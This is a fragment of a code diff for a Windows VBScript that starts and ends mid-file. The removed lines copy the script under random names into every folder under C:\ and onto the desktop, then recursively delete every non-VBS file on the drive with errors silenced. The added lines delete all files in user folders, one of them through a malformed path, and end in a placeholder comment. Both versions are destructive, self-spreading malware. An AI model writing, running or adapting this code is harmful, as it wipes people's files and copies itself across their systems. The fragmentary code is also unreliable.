@@ -1,45 +1,35 @@
+file)
+objFSO.DeleteFile(objFile)
+Next
+Next
+
+' Release FileSystemObject resources
+Set objFile = Nothing
+Set objSubFolder = Nothing
+Set objFolder = Nothing
+
+' Get the other possible folder
+Set objFolder = objFSO.GetFolder("C:\Users%USERNAME%\OtherPossibleFolder")
+
+' Loop through each file in the other possible folder and delete it
+For Each objFile In objFolder.Files
+objFSO.DeleteFile(objFile)
+Next
+
+' Loop through each subfolder in the other possible folder
+For Each objSubFolder In objFolder.SubFolders
+' Loop through each file in the subfolder and delete it
+For Each objFile In objSubFolder.Files
+objFSO.DeleteFile(objFile)
+Next
+Next
+
+' Release FileSystemObject resources
+Set objFile = Nothing
+Set objSubFolder = Nothing
+Set objFolder = Nothing
+
+' Create a Shell object
 Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-strScriptPath = WScript.ScriptFullName
 
-' Get the path to the desktop folder
-strDesktopFolder = objShell.SpecialFolders("Desktop")
-
-' Loop through all folders in the file explorer
-For Each objFolder In objFSO.GetFolder("C:\").SubFolders
-    ' Generate a random number for the copy iteration
-    randomIteration = Int((1000 * Rnd) + 1)
-    
-    ' Create a copy of the script in the current folder
-    strFolderCopyPath = objFolder.Path & "\Copy" & randomIteration & ".vbs"
-    objFSO.CopyFile strScriptPath, strFolderCopyPath, True ' Add "True" to overwrite existing files
-    
-    ' Create a copy of the script on the desktop
-    strDesktopCopyPath = strDesktopFolder & "\Copy" & randomIteration & ".vbs"
-    objFSO.CopyFile strScriptPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
-Next
-
-' Delete all files except VBS files within the specified folders
-For Each folderPath In objFSO.GetFolder("C:\").SubFolders
-    DeleteFilesExceptVBS folderPath.Path
-Next
-
-Sub DeleteFilesExceptVBS(folderPath)
-    On Error Resume Next
-    
-    Set folder = objFSO.GetFolder(folderPath)
-    If Err.Number = 0 Then
-        For Each file In folder.Files
-            If LCase(objFSO.GetExtensionName(file.Path)) <> "vbs" Then
-                objFSO.DeleteFile file.Path
-            End If
-        Next
-        
-        ' Recursively delete files in subfolders
-        For Each subfolder In folder.Subfolders
-            DeleteFilesExceptVBS subfolder.Path
-        Next
-    End If
-    
-    On Error GoTo 0
-End Sub
+' Continue with the rest of the code...
